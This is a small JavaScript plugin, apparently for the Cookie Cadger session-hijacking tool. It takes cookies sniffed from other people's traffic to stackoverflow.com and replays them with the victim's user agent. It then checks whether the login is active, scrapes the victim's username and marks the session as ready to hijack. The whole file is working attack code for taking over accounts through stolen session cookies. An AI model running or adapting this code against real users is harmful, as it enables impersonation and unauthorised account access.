importPackage(Packages.com.cookiecadger);

var description;
var sessionUri;

function processRequest(host, uri, userAgent, accept, cookies)
{
    var pageContent, usernameMatch, username;
    description = null;
    sessionUri = null;

    if ((host === 'stackoverflow.com' || host == 'www.stackoverflow.com') &&
        cookies.indexOf('usr') != -1)
    {
        pageContent = Packages.com.cookiecadger.Utils.readUrl('http://' + host, userAgent, accept, cookies);

        if (pageContent.indexOf('"profileUrl":"') != -1)
        {
            usernameMatch = pageContent.match(/class="gravatar-wrapper-24" title="(.+?)"/i);
            username = usernameMatch[1];

            description = '<html><font size=5>Stack Overflow</font><br>' + username;
            sessionUri = '/';
        }
    }
}